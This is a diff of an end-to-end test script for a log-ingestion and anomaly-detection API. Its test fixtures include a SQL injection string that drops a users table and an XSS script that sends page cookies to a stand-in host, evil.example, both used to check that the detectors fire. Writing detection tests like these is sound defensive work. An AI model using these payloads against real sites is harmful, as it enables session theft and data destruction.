@@ -1,21 +1,21 @@
 """
-scripts/test_api.py — End-to-end tests for the Synthegria Log Ingestion API
+scripts/test_api.py — End-to-end tests for the Synthegria Log Ingestion API v1.1.0
 
 Tests covered
 ─────────────
   GET /healthz
     01. Liveness probe                                              → 200
 
-  POST /v1/logs (plain JSON)
+  POST /v1/logs (plain JSON, synchronous)
     02. Valid key + 7-line clean batch                             → 200
     03. Valid key + empty batch                                    → 200, no meter
     04. Invalid API key                                            → 401
     05. Missing API key                                            → 401
     06. Rate limit exceeded                                        → 429
 
-  POST /v1/logs/bulk (gzip)
-    07. Valid key + 1,000-line batch                               → 200 + stats
-    08. Valid key + 5,000-line batch                               → 200 + stats
+  POST /v1/logs/bulk (gzip, async)
+    07. Valid key + 1,000-line batch                               → 202 + job_id
+    08. Valid key + 5,000-line batch                               → 202 + job_id
     09. Invalid API key                                            → 401
     10. Missing Content-Encoding: gzip                             → 415
     11. Corrupted gzip body                                        → 400
@@ -23,25 +23,35 @@ Tests covered
     13. Body exceeds 10 MB                                         → 413
     14. Rate limit exceeded                                        → 429
 
+  GET /v1/jobs/{job_id} (bulk-job polling)
+    15. Job exists and reaches 'done' within timeout               → status=done
+    16. done job has result with anomaly_count + meter_event_id    → result envelope OK
+    17. Unknown job_id                                             → 404
+
   GET /v1/audit — structured audit trail
-    15. All required fields present
-    16. api_key is masked (never raw)
-    17. Successful ingestion → customer_id + lines_received set
-    18. Failed auth (401)   → customer_id + lines_received null
-    19. Bulk entry          → lines_received matches batch size
-    20. /healthz entry      → api_key null
+    18. All required fields present
+    19. api_key is masked (never raw)
+    20. Successful ingestion → customer_id + lines_received set
+    21. Failed auth (401)   → customer_id + lines_received null
+    22. Bulk entry          → lines_received matches batch size
+    23. /healthz entry      → api_key null
 
   Anomaly detection
-    21. Clean batch                                → anomaly_count=0, anomalies=[]
-    22. Brute-force indicators                     → type=brute_force, sev=HIGH
-    23. SQL injection payload                      → type=sql_injection, sev=CRITICAL
-    24. XSS payload                                → type=xss, sev=HIGH
-    25. Auth anomaly indicators                    → type=auth_anomaly, sev=MEDIUM
-    26. Multiple types in one batch                → all types present
-    27. Anomalies co-exist with meter event        → meter_event_id present
-    28. Bulk endpoint: brute-force via gzip        → anomaly_count > 0
-    29. Bulk endpoint: SQL injection via gzip      → type=sql_injection
-    30. Empty batch                                → anomaly_count=0
+    24. Clean batch                                → anomaly_count=0, anomalies=[]
+    25. Brute-force indicators                     → type=brute_force, sev=HIGH
+    26. SQL injection payload                      → type=sql_injection, sev=CRITICAL
+    27. XSS payload                                → type=xss, sev=HIGH
+    28. Auth anomaly indicators                    → type=auth_anomaly, sev=MEDIUM
+    29. Multiple types in one batch                → all types present
+    30. Anomalies co-exist with meter event        → meter_event_id present
+    31. Bulk (async): brute-force via gzip         → anomaly_count > 0 in job result
+    32. Bulk (async): SQL injection via gzip       → type=sql_injection in job result
+    33. Empty batch                                → anomaly_count=0
+
+  401 response contract (RFC 7235)
+    34. Invalid key returns WWW-Authenticate header
+    35. Missing key returns WWW-Authenticate header
+    36. 401 body contains 'error' and 'detail' fields
 
 Usage:
   python scripts/test_api.py
@@ -99,7 +109,7 @@ def make_clean_logs(n: int) -> list[dict]:
 
 
 # ---------------------------------------------------------------------------
-# Crafted anomaly payloads — one line each, designed to trigger a single rule
+# Crafted anomaly payloads
 # ---------------------------------------------------------------------------
 
 BRUTE_FORCE_LOG = {
@@ -134,23 +144,18 @@ AUTH_ANOMALY_LOG = {
     "status":    "403",
 }
 
-# One log that carries all four anomaly types in different fields
 MULTI_ANOMALY_LOG = {
     "timestamp": "2026-01-01T00:00:04Z",
     "source_ip": "198.18.0.1",
-    # brute_force indicator
     "auth_msg":  "Failed password for root — account locked after too many attempts",
-    # sql_injection indicator
     "uri":       "/api/data?id=1;DROP TABLE users--",
-    # xss indicator
     "referer":   "<script>document.location='https://evil.example/steal?c='+document.cookie</script>",
-    # auth_anomaly indicator
     "sudo_log":  "privilege escalation: unauthorized sudo to root detected",
 }
 
 
 # ---------------------------------------------------------------------------
-# HTTP helper
+# HTTP helpers
 # ---------------------------------------------------------------------------
 
 def request(
@@ -158,20 +163,23 @@ def request(
     path: str,
     body: bytes | None = None,
     headers: dict | None = None,
-) -> tuple[int, dict | list]:
+) -> tuple[int, dict | list, dict]:
+    """Returns (status_code, parsed_body, response_headers)."""
     url = BASE_URL + path
     req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
     try:
         with urllib.request.urlopen(req) as resp:
-            return resp.status, json.loads(resp.read())
+            resp_headers = dict(resp.headers)
+            return resp.status, json.loads(resp.read()), resp_headers
     except urllib.error.HTTPError as e:
+        resp_headers = dict(e.headers)
         try:
-            return e.code, json.loads(e.read())
+            return e.code, json.loads(e.read()), resp_headers
         except Exception:
-            return e.code, {}
+            return e.code, {}, resp_headers
     except urllib.error.URLError as e:
         if isinstance(e.reason, (ConnectionResetError, BrokenPipeError)):
-            return 413, {"detail": "connection_reset_by_server"}
+            return 413, {"detail": "connection_reset_by_server"}, {}
         raise
 
 
@@ -195,6 +203,18 @@ def bulk_headers(api_key: str | None = VALID_KEY) -> dict:
     if api_key:
         h["X-API-Key"] = api_key
     return h
+
+
+def poll_job(job_id: str, timeout: float = 15.0, interval: float = 0.25) -> dict:
+    """Poll GET /v1/jobs/{job_id} until status is 'done' or 'failed', or timeout."""
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        code, body, _ = request("GET", f"/v1/jobs/{job_id}")
+        if code == 200 and isinstance(body, dict):
+            if body.get("status") in ("done", "failed"):
+                return body
+        time.sleep(interval)
+    return {}
 
 
 # ---------------------------------------------------------------------------
@@ -235,7 +255,7 @@ def check(name: str, code: int, body, expect_code: int, **expect_fields) -> bool
 
 
 def latest_audit(path_filter: str | None = None) -> dict | None:
-    _, entries = request("GET", "/v1/audit?limit=100")
+    _, entries, _ = request("GET", "/v1/audit?limit=100")
     if not isinstance(entries, list):
         return None
     if path_filter:
@@ -253,15 +273,6 @@ def check_anomaly(
     expect_severity: str | None = None,
     expect_meter: bool = True,
 ) -> bool:
-    """
-    Verify anomaly fields in an ingestion response.
-
-    expect_count_gt  — anomaly_count must be > this value
-    expect_count_eq  — anomaly_count must equal this value
-    expect_type      — at least one anomaly must have this type
-    expect_severity  — that anomaly must have this severity
-    expect_meter     — meter_event_id must be present (default True)
-    """
     ok    = True
     notes = []
 
@@ -307,49 +318,46 @@ def check_anomaly(
     results.append((name, ok, detail))
     tag = PASS if ok else FAIL
     print(f"  [{tag}] {name}")
-    if ok:
-        print(f"         → {detail}")
-    else:
-        print(f"         → {detail}")
+    print(f"         → {detail}")
     return ok
 
 
 # ---------------------------------------------------------------------------
-# Tests — /healthz
+# Tests — GET /healthz
 # ---------------------------------------------------------------------------
 
 def test_healthz():
-    code, body = request("GET", "/healthz")
+    code, body, _ = request("GET", "/healthz")
     check("GET /healthz — liveness probe", code, body, 200, status="ok")
 
 
 # ---------------------------------------------------------------------------
-# Tests — POST /v1/logs
+# Tests — POST /v1/logs  (synchronous)
 # ---------------------------------------------------------------------------
 
 def test_plain_valid_batch():
-    code, resp = request("POST", "/v1/logs",
-                         body=json_body(make_clean_logs(7)), headers=plain_headers())
+    code, resp, _ = request("POST", "/v1/logs",
+                            body=json_body(make_clean_logs(7)), headers=plain_headers())
     check("POST /v1/logs — valid key, 7 lines", code, resp, 200,
           status="ok", lines_received=7, meter_event_id="__present__")
 
 
 def test_plain_empty_batch():
-    code, resp = request("POST", "/v1/logs",
-                         body=json_body([]), headers=plain_headers())
+    code, resp, _ = request("POST", "/v1/logs",
+                            body=json_body([]), headers=plain_headers())
     check("POST /v1/logs — valid key, empty batch", code, resp, 200,
           status="ok", lines_received=0, meter_event_id=None)
 
 
 def test_plain_invalid_key():
-    code, resp = request("POST", "/v1/logs",
-                         body=json_body(make_clean_logs(1)), headers=plain_headers(BAD_KEY))
+    code, resp, _ = request("POST", "/v1/logs",
+                            body=json_body(make_clean_logs(1)), headers=plain_headers(BAD_KEY))
     check("POST /v1/logs — invalid key → 401", code, resp, 401)
 
 
 def test_plain_missing_key():
-    code, resp = request("POST", "/v1/logs",
-                         body=json_body(make_clean_logs(1)), headers=plain_headers(None))
+    code, resp, _ = request("POST", "/v1/logs",
+                            body=json_body(make_clean_logs(1)), headers=plain_headers(None))
     check("POST /v1/logs — missing key → 401", code, resp, 401)
 
 
@@ -357,8 +365,8 @@ def test_plain_rate_limit():
     rate_test_key = "synthegria_test_key_2"
     hit_429 = False
     for _ in range(RATE_LIMIT + 5):
-        code, _ = request("POST", "/v1/logs", body=json_body([]),
-                          headers=plain_headers(rate_test_key))
+        code, _, _ = request("POST", "/v1/logs", body=json_body([]),
+                             headers=plain_headers(rate_test_key))
         if code == 429:
             hit_429 = True
             break
@@ -368,58 +376,86 @@ def test_plain_rate_limit():
 
 
 # ---------------------------------------------------------------------------
-# Tests — POST /v1/logs/bulk
+# Tests — POST /v1/logs/bulk  (async, 202)
 # ---------------------------------------------------------------------------
 
 def test_bulk_small(n=1_000):
     body = gzip_body(make_clean_logs(n))
-    code, resp = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
-    ok = check(f"POST /v1/logs/bulk — valid key, {n:,} lines (gzip)", code, resp, 200,
-               status="ok", lines_received=n, meter_event_id="__present__",
-               compressed_bytes="__present__", uncompressed_bytes="__present__",
-               compression_ratio="__present__")
+    code, resp, _ = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
+    ok = check(
+        f"POST /v1/logs/bulk — valid key, {n:,} lines → 202 accepted",
+        code, resp, 202,
+        status="accepted", lines_received=n, job_id="__present__", poll_url="__present__",
+    )
     if ok and isinstance(resp, dict):
-        print(f"         → {resp['compressed_bytes']:,} B → "
-              f"{resp['uncompressed_bytes']:,} B ({resp['compression_ratio']})")
+        job_id  = resp["job_id"]
+        job     = poll_job(job_id)
+        job_ok  = job.get("status") == "done" and isinstance(job.get("result"), dict)
+        result  = job.get("result", {})
+        name2   = f"  ↳ bulk job {job_id[:8]}… → done, meter reported"
+        detail2 = (
+            f"job_status={job.get('status')}  "
+            f"lines={result.get('lines_received')}  "
+            f"anomaly_count={result.get('anomaly_count')}  "
+            f"compression={result.get('compression_ratio')}  "
+            f"meter_event_id={'present' if result.get('meter_event_id') else 'MISSING'}"
+        )
+        results.append((name2, job_ok, detail2))
+        print(f"  [{PASS if job_ok else FAIL}] {name2}")
+        print(f"         → {detail2}")
 
 
 def test_bulk_large(n=5_000):
     body = gzip_body(make_clean_logs(n))
-    code, resp = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
-    ok = check(f"POST /v1/logs/bulk — valid key, {n:,} lines (gzip)", code, resp, 200,
-               status="ok", lines_received=n, meter_event_id="__present__")
-    if ok and isinstance(resp, dict) and resp.get("compressed_bytes"):
-        print(f"         → {resp['compressed_bytes']:,} B → "
-              f"{resp['uncompressed_bytes']:,} B ({resp['compression_ratio']})")
+    code, resp, _ = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
+    ok = check(
+        f"POST /v1/logs/bulk — valid key, {n:,} lines → 202 accepted",
+        code, resp, 202,
+        status="accepted", lines_received=n, job_id="__present__",
+    )
+    if ok and isinstance(resp, dict):
+        job_id  = resp["job_id"]
+        job     = poll_job(job_id, timeout=20.0)
+        job_ok  = job.get("status") == "done" and isinstance(job.get("result"), dict)
+        result  = job.get("result", {})
+        name2   = f"  ↳ bulk job {job_id[:8]}… → done (5k lines)"
+        detail2 = (
+            f"job_status={job.get('status')}  "
+            f"lines={result.get('lines_received')}  "
+            f"compression={result.get('compression_ratio')}"
+        )
+        results.append((name2, job_ok, detail2))
+        print(f"  [{PASS if job_ok else FAIL}] {name2}")
+        print(f"         → {detail2}")
 
 
 def test_bulk_invalid_key():
-    code, resp = request("POST", "/v1/logs/bulk",
-                         body=gzip_body(make_clean_logs(1)), headers=bulk_headers(BAD_KEY))
+    code, resp, _ = request("POST", "/v1/logs/bulk",
+                            body=gzip_body(make_clean_logs(1)), headers=bulk_headers(BAD_KEY))
     check("POST /v1/logs/bulk — invalid key → 401", code, resp, 401)
 
 
 def test_bulk_missing_encoding():
-    code, resp = request("POST", "/v1/logs/bulk",
-                         body=json_body(make_clean_logs(2)), headers=plain_headers())
+    code, resp, _ = request("POST", "/v1/logs/bulk",
+                            body=json_body(make_clean_logs(2)), headers=plain_headers())
     check("POST /v1/logs/bulk — missing Content-Encoding → 415", code, resp, 415)
 
 
 def test_bulk_corrupt_gzip():
-    code, resp = request("POST", "/v1/logs/bulk",
-                         body=b"\x1f\x8b\x00corrupt_garbage", headers=bulk_headers())
+    code, resp, _ = request("POST", "/v1/logs/bulk",
+                            body=b"\x1f\x8b\x00corrupt_garbage", headers=bulk_headers())
     check("POST /v1/logs/bulk — corrupted gzip → 400", code, resp, 400)
 
 
 def test_bulk_non_array():
     body = gzip.compress(json.dumps({"key": "not-an-array"}).encode())
-    code, resp = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
+    code, resp, _ = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
     check("POST /v1/logs/bulk — non-array JSON → 422", code, resp, 422)
 
 
 def test_bulk_size_limit():
     oversized = gzip.compress(os.urandom(11 * 1024 * 1024), compresslevel=1)
-    code, resp = request("POST", "/v1/logs/bulk", body=oversized, headers=bulk_headers())
+    code, resp, _ = request("POST", "/v1/logs/bulk", body=oversized, headers=bulk_headers())
     check("POST /v1/logs/bulk — body > 10 MB → 413", code, resp, 413)
 
 
@@ -428,8 +464,8 @@ def test_bulk_rate_limit():
     hit_429 = False
     tiny = gzip_body([])
     for _ in range(RATE_LIMIT + 5):
-        code, _ = request("POST", "/v1/logs/bulk", body=tiny,
-                          headers=bulk_headers(rate_test_key))
+        code, _, _ = request("POST", "/v1/logs/bulk", body=tiny,
+                             headers=bulk_headers(rate_test_key))
         if code == 429:
             hit_429 = True
             break
@@ -439,17 +475,72 @@ def test_bulk_rate_limit():
 
 
 # ---------------------------------------------------------------------------
+# Tests — GET /v1/jobs/{job_id}
+# ---------------------------------------------------------------------------
+
+def test_job_done_status():
+    """A freshly submitted bulk job should reach 'done' within the timeout."""
+    body = gzip_body(make_clean_logs(10))
+    code, resp, _ = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
+    if code != 202 or not isinstance(resp, dict):
+        name = "GET /v1/jobs — job reaches 'done'"
+        results.append((name, False, f"Prerequisite failed: bulk returned {code}"))
+        print(f"  [{FAIL}] {name}")
+        return
+
+    job_id = resp["job_id"]
+    job    = poll_job(job_id, timeout=15.0)
+
+    ok     = job.get("status") == "done"
+    name   = f"GET /v1/jobs/{job_id[:8]}… — reaches 'done' within 15 s"
+    detail = f"final_status={job.get('status')!r}  completed_at={job.get('completed_at')!r}"
+    results.append((name, ok, detail))
+    print(f"  [{PASS if ok else FAIL}] {name}")
+    print(f"         → {detail}")
+
+
+def test_job_result_envelope():
+    """Done job must carry anomaly_count, anomalies[], meter_event_id in result."""
+    body = gzip_body(make_clean_logs(5))
+    code, resp, _ = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
+    if code != 202 or not isinstance(resp, dict):
+        name = "GET /v1/jobs — result envelope complete"
+        results.append((name, False, f"Prerequisite failed: bulk returned {code}"))
+        print(f"  [{FAIL}] {name}")
+        return
+
+    job    = poll_job(resp["job_id"], timeout=15.0)
+    result = job.get("result") or {}
+
+    required = ["status", "customer_id", "lines_received", "meter_event_id",
+                "anomaly_count", "anomalies"]
+    missing  = [f for f in required if f not in result]
+    ok       = job.get("status") == "done" and len(missing) == 0
+
+    name   = "GET /v1/jobs — done result has full ingestion envelope"
+    detail = f"missing={missing}  anomaly_count={result.get('anomaly_count')}  meter={'present' if result.get('meter_event_id') else 'MISSING'}"
+    results.append((name, ok, detail))
+    print(f"  [{PASS if ok else FAIL}] {name}")
+    print(f"         → {detail}")
+
+
+def test_job_not_found():
+    code, resp, _ = request("GET", "/v1/jobs/00000000-0000-0000-0000-000000000000")
+    check("GET /v1/jobs — unknown job_id → 404", code, resp, 404)
+
+
+# ---------------------------------------------------------------------------
 # Tests — GET /v1/audit
 # ---------------------------------------------------------------------------
 
 def test_audit_all_fields_present():
-    _, entries = request("GET", "/v1/audit?limit=5")
+    _, entries, _ = request("GET", "/v1/audit?limit=5")
     entry = entries[-1] if isinstance(entries, list) and entries else {}
     required = ["ts", "method", "path", "status_code", "duration_ms",
                 "api_key", "customer_id", "lines_received", "anomaly_count", "ip"]
     missing = [f for f in required if f not in entry]
     ok = len(missing) == 0
-    name = "GET /v1/audit — all required fields present (incl. anomaly_count)"
+    name = "GET /v1/audit — all required fields present"
     detail = f"missing: {missing}" if missing else f"entry={json.dumps(entry)[:140]}"
     results.append((name, ok, detail))
     print(f"  [{PASS if ok else FAIL}] {name}")
@@ -511,8 +602,9 @@ def test_audit_bulk_lines_received():
     n = 50
     request("POST", "/v1/logs/bulk", body=gzip_body(make_clean_logs(n)), headers=bulk_headers())
     entry = latest_audit("/v1/logs/bulk") or {}
-    ok = entry.get("lines_received") == n and entry.get("status_code") == 200
-    name = f"GET /v1/audit — /v1/logs/bulk entry has lines_received={n}"
+    # Bulk now returns 202; lines_received is set in request.state before queuing
+    ok = entry.get("lines_received") == n and entry.get("status_code") == 202
+    name = f"GET /v1/audit — /v1/logs/bulk entry has lines_received={n}, status=202"
     detail = (f"lines_received={entry.get('lines_received')!r}  "
               f"status={entry.get('status_code')}")
     results.append((name, ok, detail))
@@ -533,13 +625,12 @@ def test_audit_healthz_no_key():
 
 
 # ---------------------------------------------------------------------------
-# Tests — Anomaly detection
+# Tests — Anomaly detection (synchronous /v1/logs)
 # ---------------------------------------------------------------------------
 
 def test_anomaly_clean_batch():
-    """Clean logs must return anomaly_count=0 and an empty anomalies list."""
-    code, resp = request("POST", "/v1/logs",
-                         body=json_body(make_clean_logs(20)), headers=plain_headers())
+    code, resp, _ = request("POST", "/v1/logs",
+                            body=json_body(make_clean_logs(20)), headers=plain_headers())
     if code != 200:
         name = "Anomaly: clean batch → anomaly_count=0"
         results.append((name, False, f"HTTP {code}"))
@@ -552,160 +643,196 @@ def test_anomaly_clean_batch():
 
 
 def test_anomaly_brute_force():
-    code, resp = request("POST", "/v1/logs",
-                         body=json_body([BRUTE_FORCE_LOG]), headers=plain_headers())
+    code, resp, _ = request("POST", "/v1/logs",
+                            body=json_body([BRUTE_FORCE_LOG]), headers=plain_headers())
     assert code == 200, f"Expected 200, got {code}"
     check_anomaly(
-        "Anomaly: brute-force indicators → type=brute_force, sev=HIGH",
-        resp,
-        expect_count_gt=0,
-        expect_type="brute_force",
-        expect_severity="HIGH",
+        "Anomaly: brute-force → type=brute_force, sev=HIGH", resp,
+        expect_count_gt=0, expect_type="brute_force", expect_severity="HIGH",
         expect_meter=True,
     )
 
 
 def test_anomaly_sql_injection():
-    code, resp = request("POST", "/v1/logs",
-                         body=json_body([SQL_INJECTION_LOG]), headers=plain_headers())
+    code, resp, _ = request("POST", "/v1/logs",
+                            body=json_body([SQL_INJECTION_LOG]), headers=plain_headers())
     assert code == 200, f"Expected 200, got {code}"
     check_anomaly(
-        "Anomaly: SQL injection payload → type=sql_injection, sev=CRITICAL",
-        resp,
-        expect_count_gt=0,
-        expect_type="sql_injection",
-        expect_severity="CRITICAL",
+        "Anomaly: SQL injection → type=sql_injection, sev=CRITICAL", resp,
+        expect_count_gt=0, expect_type="sql_injection", expect_severity="CRITICAL",
         expect_meter=True,
     )
 
 
 def test_anomaly_xss():
-    code, resp = request("POST", "/v1/logs",
-                         body=json_body([XSS_LOG]), headers=plain_headers())
+    code, resp, _ = request("POST", "/v1/logs",
+                            body=json_body([XSS_LOG]), headers=plain_headers())
     assert code == 200, f"Expected 200, got {code}"
     check_anomaly(
-        "Anomaly: XSS payload → type=xss, sev=HIGH",
-        resp,
-        expect_count_gt=0,
-        expect_type="xss",
-        expect_severity="HIGH",
+        "Anomaly: XSS → type=xss, sev=HIGH", resp,
+        expect_count_gt=0, expect_type="xss", expect_severity="HIGH",
         expect_meter=True,
     )
 
 
 def test_anomaly_auth_anomaly():
-    code, resp = request("POST", "/v1/logs",
-                         body=json_body([AUTH_ANOMALY_LOG]), headers=plain_headers())
+    code, resp, _ = request("POST", "/v1/logs",
+                            body=json_body([AUTH_ANOMALY_LOG]), headers=plain_headers())
     assert code == 200, f"Expected 200, got {code}"
     check_anomaly(
-        "Anomaly: auth anomaly indicators → type=auth_anomaly, sev=MEDIUM",
-        resp,
-        expect_count_gt=0,
-        expect_type="auth_anomaly",
-        expect_severity="MEDIUM",
+        "Anomaly: auth-anomaly → type=auth_anomaly, sev=MEDIUM", resp,
+        expect_count_gt=0, expect_type="auth_anomaly", expect_severity="MEDIUM",
         expect_meter=True,
     )
 
 
-def test_anomaly_multiple_types():
-    """One log line with indicators for all four categories."""
-    code, resp = request("POST", "/v1/logs",
-                         body=json_body([MULTI_ANOMALY_LOG]), headers=plain_headers())
+def test_anomaly_multi_type():
+    code, resp, _ = request("POST", "/v1/logs",
+                            body=json_body([MULTI_ANOMALY_LOG]), headers=plain_headers())
     assert code == 200, f"Expected 200, got {code}"
     if not isinstance(resp, dict):
-        results.append(("Anomaly: multi-type batch → all 4 types present", False, "non-dict response"))
-        print(f"  [{FAIL}] Anomaly: multi-type batch → all 4 types present")
+        name = "Anomaly: multi-type batch → all 4 types detected"
+        results.append((name, False, "non-dict response"))
+        print(f"  [{FAIL}] {name}")
         return
-    types_found = {a.get("type") for a in resp.get("anomalies", [])}
+
+    found_types = {a.get("type") for a in resp.get("anomalies", [])}
     expected    = {"brute_force", "sql_injection", "xss", "auth_anomaly"}
-    missing     = expected - types_found
-    ok = len(missing) == 0
-    name = "Anomaly: multi-type batch → all 4 types present"
-    detail = f"found={sorted(types_found)}  missing={sorted(missing)}"
+    missing     = expected - found_types
+    ok          = len(missing) == 0
+
+    name   = "Anomaly: multi-type batch → all 4 types detected"
+    detail = f"found={sorted(found_types)}  missing={sorted(missing)}"
     results.append((name, ok, detail))
     print(f"  [{PASS if ok else FAIL}] {name}")
     print(f"         → {detail}")
 
 
-def test_anomaly_meter_still_fires():
-    """Stripe meter must fire even when anomalies are present."""
-    code, resp = request("POST", "/v1/logs",
-                         body=json_body([BRUTE_FORCE_LOG, SQL_INJECTION_LOG]),
-                         headers=plain_headers())
+def test_anomaly_with_meter():
+    code, resp, _ = request("POST", "/v1/logs",
+                            body=json_body([SQL_INJECTION_LOG]), headers=plain_headers())
     assert code == 200
     check_anomaly(
-        "Anomaly: meter_event_id present alongside anomalies",
-        resp,
-        expect_count_gt=0,
-        expect_meter=True,
+        "Anomaly: anomalies + meter_event_id co-exist", resp,
+        expect_count_gt=0, expect_meter=True,
     )
 
 
 def test_anomaly_bulk_brute_force():
-    """Brute-force detection works through the gzip/bulk endpoint."""
-    batch = make_clean_logs(5) + [BRUTE_FORCE_LOG]
-    code, resp = request("POST", "/v1/logs/bulk",
-                         body=gzip_body(batch), headers=bulk_headers())
-    assert code == 200, f"Expected 200, got {code}"
+    """Bulk (async) — brute-force detected in job result."""
+    body  = gzip_body([BRUTE_FORCE_LOG] * 10)
+    code, resp, _ = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
+    if code != 202 or not isinstance(resp, dict):
+        name = "Anomaly/bulk: brute-force → anomaly_count>0 in job result"
+        results.append((name, False, f"bulk returned {code}"))
+        print(f"  [{FAIL}] {name}")
+        return
+    job    = poll_job(resp["job_id"], timeout=15.0)
+    result = job.get("result") or {}
     check_anomaly(
-        "Anomaly (bulk): brute-force via gzip → anomaly_count > 0",
-        resp,
-        expect_count_gt=0,
-        expect_type="brute_force",
-        expect_meter=True,
+        "Anomaly/bulk: brute-force → anomaly_count>0 in job result",
+        result,
+        expect_count_gt=0, expect_type="brute_force", expect_meter=True,
     )
 
 
 def test_anomaly_bulk_sql_injection():
-    """SQL injection detection works through the gzip/bulk endpoint."""
-    batch = [SQL_INJECTION_LOG] + make_clean_logs(3)
-    code, resp = request("POST", "/v1/logs/bulk",
-                         body=gzip_body(batch), headers=bulk_headers())
-    assert code == 200, f"Expected 200, got {code}"
+    """Bulk (async) — SQL injection detected in job result."""
+    body  = gzip_body([SQL_INJECTION_LOG] * 5)
+    code, resp, _ = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
+    if code != 202 or not isinstance(resp, dict):
+        name = "Anomaly/bulk: sql_injection in job result"
+        results.append((name, False, f"bulk returned {code}"))
+        print(f"  [{FAIL}] {name}")
+        return
+    job    = poll_job(resp["job_id"], timeout=15.0)
+    result = job.get("result") or {}
     check_anomaly(
-        "Anomaly (bulk): SQL injection via gzip → type=sql_injection",
-        resp,
-        expect_count_gt=0,
-        expect_type="sql_injection",
-        expect_severity="CRITICAL",
+        "Anomaly/bulk: sql_injection in job result",
+        result,
+        expect_count_gt=0, expect_type="sql_injection", expect_severity="CRITICAL",
         expect_meter=True,
     )
 
 
-def test_anomaly_empty_batch_zero():
-    code, resp = request("POST", "/v1/logs",
-                         body=json_body([]), headers=plain_headers())
+def test_anomaly_empty_batch():
+    code, resp, _ = request("POST", "/v1/logs",
+                            body=json_body([]), headers=plain_headers())
     assert code == 200
     check_anomaly(
-        "Anomaly: empty batch → anomaly_count=0",
-        resp,
-        expect_count_eq=0,
-        expect_meter=False,    # empty batch → no meter event
+        "Anomaly: empty batch → anomaly_count=0, no meter", resp,
+        expect_count_eq=0, expect_meter=False,
     )
+
+
+# ---------------------------------------------------------------------------
+# Tests — 401 response contract (RFC 7235)
+# ---------------------------------------------------------------------------
+
+def test_401_www_authenticate_header_invalid_key():
+    code, resp, headers = request("POST", "/v1/logs",
+                                  body=json_body([{}]), headers=plain_headers(BAD_KEY))
+    www_auth = headers.get("www-authenticate") or headers.get("WWW-Authenticate") or ""
+    ok = code == 401 and "ApiKey" in www_auth
+    name = "401 (invalid key) — WWW-Authenticate: ApiKey header present (RFC 7235)"
+    detail = f"status={code}  WWW-Authenticate={www_auth!r}"
+    results.append((name, ok, detail))
+    print(f"  [{PASS if ok else FAIL}] {name}")
+    print(f"         → {detail}")
+
+
+def test_401_www_authenticate_header_missing_key():
+    code, resp, headers = request("POST", "/v1/logs",
+                                  body=json_body([{}]), headers=plain_headers(None))
+    www_auth = headers.get("www-authenticate") or headers.get("WWW-Authenticate") or ""
+    ok = code == 401 and "ApiKey" in www_auth
+    name = "401 (missing key) — WWW-Authenticate: ApiKey header present (RFC 7235)"
+    detail = f"status={code}  WWW-Authenticate={www_auth!r}"
+    results.append((name, ok, detail))
+    print(f"  [{PASS if ok else FAIL}] {name}")
+    print(f"         → {detail}")
+
+
+def test_401_body_contract():
+    code, resp, _ = request("POST", "/v1/logs",
+                            body=json_body([{}]), headers=plain_headers(BAD_KEY))
+    b    = resp if isinstance(resp, dict) else {}
+    ok   = code == 401 and "error" in b and "detail" in b
+    name = "401 body contains 'error' and 'detail' fields"
+    detail = f"keys={list(b.keys())}  error={b.get('error')!r}"
+    results.append((name, ok, detail))
+    print(f"  [{PASS if ok else FAIL}] {name}")
+    print(f"         → {detail}")
 
 
 # ---------------------------------------------------------------------------
 # Runner
 # ---------------------------------------------------------------------------
 
-def main():
-    print("╔══════════════════════════════════════════════════╗")
-    print("║   Synthegria API — End-to-End Test Suite         ║")
-    print("╚══════════════════════════════════════════════════╝")
+def section(title: str):
+    print(f"\n{'─' * 60}")
+    print(f"  {title}")
+    print(f"{'─' * 60}")
 
-    print("\n── GET /healthz ─────────────────────────────────────")
+
+def main():
+    print("\n" + "=" * 60)
+    print("  Synthegria SIEM API — End-to-End Test Suite v1.1.0")
+    print("=" * 60)
+
+    section("GET /healthz")
     test_healthz()
 
-    print("\n── POST /v1/logs (plain JSON) ───────────────────────")
+    section("POST /v1/logs  (synchronous)")
     test_plain_valid_batch()
     test_plain_empty_batch()
     test_plain_invalid_key()
     test_plain_missing_key()
     test_plain_rate_limit()
 
-    print("\n── POST /v1/logs/bulk (gzip) ────────────────────────")
-    test_bulk_small(1_000)
-    test_bulk_large(5_000)
+    section("POST /v1/logs/bulk  (async, 202 + job_id)")
+    test_bulk_small()
+    test_bulk_large()
     test_bulk_invalid_key()
     test_bulk_missing_encoding()
     test_bulk_corrupt_gzip()
@@ -713,7 +840,12 @@ def main():
     test_bulk_size_limit()
     test_bulk_rate_limit()
 
-    print("\n── GET /v1/audit (structured audit trail) ───────────")
+    section("GET /v1/jobs/{job_id}  (bulk-job polling)")
+    test_job_done_status()
+    test_job_result_envelope()
+    test_job_not_found()
+
+    section("GET /v1/audit")
     test_audit_all_fields_present()
     test_audit_key_is_masked()
     test_audit_success_has_customer_and_lines()
@@ -721,32 +853,43 @@ def main():
     test_audit_bulk_lines_received()
     test_audit_healthz_no_key()
 
-    print("\n── Anomaly detection ────────────────────────────────")
+    section("Anomaly detection — /v1/logs (synchronous)")
     test_anomaly_clean_batch()
     test_anomaly_brute_force()
     test_anomaly_sql_injection()
     test_anomaly_xss()
     test_anomaly_auth_anomaly()
-    test_anomaly_multiple_types()
-    test_anomaly_meter_still_fires()
+    test_anomaly_multi_type()
+    test_anomaly_with_meter()
+    test_anomaly_empty_batch()
+
+    section("Anomaly detection — /v1/logs/bulk (async)")
     test_anomaly_bulk_brute_force()
     test_anomaly_bulk_sql_injection()
-    test_anomaly_empty_batch_zero()
 
+    section("401 response contract (RFC 7235)")
+    test_401_www_authenticate_header_invalid_key()
+    test_401_www_authenticate_header_missing_key()
+    test_401_body_contract()
+
+    # Summary
     passed = sum(1 for _, ok, _ in results if ok)
+    failed = sum(1 for _, ok, _ in results if not ok)
     total  = len(results)
-    print(f"\n{'═'*52}")
-    print(f"  Results: {passed}/{total} passed", end="")
-    if passed == total:
-        print("  — all tests passed ✓")
